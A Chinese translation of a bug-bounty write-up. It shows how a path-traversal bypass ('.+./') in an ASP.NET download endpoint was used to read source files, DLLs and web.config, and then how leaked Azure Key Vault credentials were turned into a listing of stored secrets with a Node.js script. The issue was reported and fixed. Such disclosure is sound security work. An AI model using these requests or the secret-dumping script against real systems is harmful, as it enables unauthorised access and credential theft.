***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

**ASP.net应用程序中最常见的漏洞之一就是本地文件披露漏洞（LFD），如果你之前从没接触过这种技术的话，那么利用LFD对你来说可能就没啥意义了。在这篇文章中，我将跟大家介绍我如何利用LFD来渗透一个应用程序，并最终拿到了1.7万美金的漏洞奖励。**  

![1.png](https://image.3001.net/images/20190124/1548300195_5c492fa38dc41.png!small)

## 识别漏洞

在我近期进行的一项研究中，我找到了下面这个入口：

    
    
    https://domain.com/utility/download.aspx?f=DJ/lc1jVgHTZF...

加载这个页面时，它会从服务器的另一个路径下载一个有用的文档。当时我不认为我可以篡改这个功能，因为它使用了一个加密参数，但我一直记得这个事情。如果我能够破解密钥（可能是AES），并设置该参数，那我就可以伪造参数并利用LFD了。

令我惊讶的是，我在该网站的另一个地方也遇到了相同节点：

    
    
    https://domain.com/utility/download.aspx?f=file1234.docx

然后我接收到了：

    
    
    HTTP/1.1200 OK
    Connection:close
    Content-Length:27363
     
    Ïó|uœ
    Z^tÙ¢yÇ¯;­!Y,}{ûCƒ³/h>
    ...

这里提供的参数是download.aspx，但我竟然可以直接看到download.aspx文件的源地址：

    
    
    GET /utility/download.aspx?f=download.aspx

响应如下：

    
    
    HTTP/1.1200 OK
    Connection:close
    Content-Length:263
     
    <%@Page Language="C#" AutoEventWireup="true"Debug="true" %>
    ...

能够读取download.aspx，意味着我可以读取任何文件，而且网站的文件存储路径为filename.aspx.cs。但是，.aspx.cs文件时无法访问的。点击【[这里](https://stackoverflow.com/questions/13182757/what-is-the-difference-between-aspx-and-aspx-cs)】了解.aspx和.aspx.cs的区别。

## 绕过遍历块

除此之外，我还发现我无法在结尾添加两个点号(..)，否则收到的响应请求应该是“400 bad request”即请求失败。

这里我尝试了模糊测试方法来查看它会忽略或过滤的字符，我使用的请求如下：

    
    
    GET /utility/download.aspx?f=.[fuzz]./utility/download.aspx

![看我如何通过ASP
Secrets读取获得了1.7万美金的漏洞奖励](https://image.3001.net/images/20190124/1548300314_5c49301a03a0e.png!small)

这里我手动枚举了字符，直到我发现.+./utility/download.aspx可以返回download.aspx的内容。这就非常棒了，因为我可以遍历目录了。原因是什么我也不清楚，但是我在我自己的ASP.NET应用中测试了一下，结果是无效的，所以应该是这里存在有安全漏洞。

接下来，我想尝试读取一个.ashx文件，结果竟然成功了！

    
    
    HTTP/1.1200 OK
    Connection:close
    Content-Length:2398
     
    <%@WebHandler Language="C#" Class="redacted.redacted" %>
     
    Imports System
    Imports System.Data
    Imports System.Data.SqlClient
    Imports System.IO
    Imports System.Web
    Imports System.Configuration
    ...

这至少证明了，我可以直接读取一些敏感文件了。下一步，就是读取更多的源代码。

通过发送下列请求，我可以直接从源文件中导出DLL文件【[参考资料](https://blogs.msdn.microsoft.com/tom/2008/07/21/asp-net-tips-loading-a-dll-out-of-the-bin-directory/)】：

    
    
    GET /utility/download.aspx?f=.+./.+./bin/redacted.dll

下载该文件之后，攻击者将能够使用[dnSpy](https://github.com/0xd4d/dnSpy)来导入DLL，然后恢复应用程序的源码：

![看我如何通过ASP
Secrets读取获得了1.7万美金的漏洞奖励](https://image.3001.net/images/20190124/1548300326_5c4930267d59a.png!small)

ASP.NET应用程序中还有一种web.config文件，这种文件实际上是一个设置页面，可帮助用户设置整个Web服务器中各种独立页面的变量参数。更重要的是，这种文件里存储了大量敏感信息，例如SQL服务器的凭证以及加密密钥等等。

下面给出的是一份web.config文件样本：

    
    
    <?xmlversion="1.0" encoding="utf-8"?>
    <!--      For more information on how to configure yourASP.NET application, please visit
      http://go.microsoft.com/fwlink/?LinkId=301880
      -->
    <configuration>
      <appSettings>
        <add key="webpages:Version"value="3.0.0.0" />
        <add key="webpages:Enabled"value="false" />
        <addkey="ClientValidationEnabled" value="true" />
        <add key="UnobtrusiveJavaScriptEnabled"value="true" />
     
        <add key="PodioClientId"value="" />
        <add key="PodioClientSecret"value="" />
       
        <add key="AppId"value="" />
        <add key="SpaceId"value="" />
      </appSettings>
     
      <connectionStrings>
        <remove name="umbracoDbDSN"/>
        <addname="PodioAspnetSampleDb"connectionString="server=WSA07;database=PodioAspnetSampleDb;userid=sa;password=pass" providerName="System.Data.SqlClient" />
      </connectionStrings>
     
      <system.web>
        <compilation debug="true"targetFramework="4.5" />
        <httpRuntimetargetFramework="4.5" />
      </system.web>
    </configuration>

为了读取目标站点的web.config文件，我只需要发送下列请求即可：

    
    
    GET /utility/download.aspx?f=.+./.+./web.config

返回的响应信息如下，其中包含了很多敏感信息：

    
    
    ...
    <addkey="keyVaultDataPlaneUri" value="redacted" />
    <addkey="uniqueKeyVaultNameUri" value="redacted" />
    <addkey="keyVaultClientId" value="redacted" />
    <addkey="keyVaultClientSecretIdentifier" value="redacted" />
    <addkey="keyVaultClientTenantName" value="redacted" />
    <addkey="keyVaultAuthenticationContextUri" value="redacted"/>
    <addkey="keyVaultApiVersion" value="2016-10-01" />
    ...

如果使用得当，我们将能够访问Azure Key Vault实例。Azure Key
Vault主要用来存储应用程序的机密信息，一般都会存储很多有价值的数据。这里给大家提供了一个Node.js脚本来访问Azure Key
Vault实例并从中提取密钥信息：

    
    
    var KeyVault = require('azure-keyvault');
    var AuthenticationContext = require('adal-node').AuthenticationContext;
     
    var clientId = "clientId";
    var clientSecret = "clientSecret";
    var vaultUri = "vaultUri";
     
    //Authenticator - retrieves the access token
    var authenticator= function (challenge, callback) {
     
      // Create a new authentication context.
      var context = newAuthenticationContext(challenge.authorization);
     
      // Use the context to acquire anauthentication token.
      return context.acquireTokenWithClientCredentials(challenge.resource,clientId, clientSecret, function (err, tokenResponse) {
        if (err) throw err;
        // Calculate the value to be set in therequest's Authorization header and resume the call.
        var authorizationValue =tokenResponse.tokenType + ' ' + tokenResponse.accessToken;
        console.log(authorizationValue);
        return callback(null, authorizationValue);
      });
     
    };
     
    var credentials = new KeyVault.KeyVaultCredentials(authenticator);
    var client = new KeyVault.KeyVaultClient(credentials);
     
    client.getSecrets(vaultUri).then(function(value){
        console.log(value);
    });

响应数据如下：

    
    
    { id:
        'https://redacted.vault.azure.net/secrets/ftp_credentials',
        attributes:
         { enabled: true,
           created: 2018-01-23T22:14:18.000Z,
           updated: 2018-01-23T22:14:18.000Z,
           recoveryLevel: 'Purgeable' },
        contentType: 'secret' } ]
     
    ...more secrets ...

没错，就是这么简单。当我发现该问题之后，便立刻将其上报给相关厂商，并拿到了1万7千美金的漏洞奖励。

 *** 参考来源：[samcurry](https://samcurry.net/reading-asp-secrets-for-17000/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

